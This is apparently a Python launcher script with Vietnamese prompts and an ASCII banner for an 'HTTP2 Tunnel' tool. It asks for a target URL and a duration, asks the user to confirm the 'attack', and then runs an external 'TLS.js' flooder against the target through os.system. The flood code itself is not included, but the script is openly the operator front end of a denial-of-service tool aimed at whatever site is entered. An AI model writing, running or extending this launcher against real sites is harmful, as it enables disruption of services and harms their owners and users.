import os
from os import name, system
if name == 'nt':
    system("title Đậu Đậu - HTTP2 Tunnel")
    system("mode 160, 40")
os.system("cls" if os.name == "nt" else "clear")
jawbreaker = """
  ________  __         ______             __                                                       
 /        |/  |       /      \           /  |                                                      
 $$$$$$$$/ $$ |      /$$$$$$  |         _$$ |_    __    __  _______   _______    ______    ______  
    $$ |   $$ |      $$ \__$$/  ______ / $$   |  /  |  /  |/       \ /       \  /      \  /      \ 
    $$ |   $$ |      $$      \ /      |$$$$$$/   $$ |  $$ |$$$$$$$  |$$$$$$$  |/$$$$$$  |/$$$$$$  |
    $$ |   $$ |       $$$$$$  |$$$$$$/   $$ | __ $$ |  $$ |$$ |  $$ |$$ |  $$ |$$    $$ |$$ |  $$/ 
    $$ |   $$ |_____ /  \__$$ |          $$ |/  |$$ \__$$ |$$ |  $$ |$$ |  $$ |$$$$$$$$/ $$ |      
    $$ |   $$       |$$    $$/           $$  $$/ $$    $$/ $$ |  $$ |$$ |  $$ |$$       |$$ |      
    $$/    $$$$$$$$/  $$$$$$/             $$$$/   $$$$$$/  $$/   $$/ $$/   $$/  $$$$$$$/ $$/       
"""
author = "                                   * * * {} * * *".format("  Đậu Đậu  ")
print(jawbreaker)
print(author)
host=input("       [+] Nhập URL Taget: ")
time=int(input("       [+] Nhập Time (s): "))
print("  =========================================================================")
print("       Vui lòng xác nhận attack (Enter)")
input()
os.system("cls" if os.name == "nt" else "clear")
print()
print("  =========================================================================")
print("       Mục tiêu               =     {}".format(host))
print("       Thời gian              =     {}".format(time))
print("       Methoads (default)     =     GET")
print("       Cổng (default)         =     443")
print("  =========================================================================")
os.system(f"node TLS.js {host} {time}")
input()
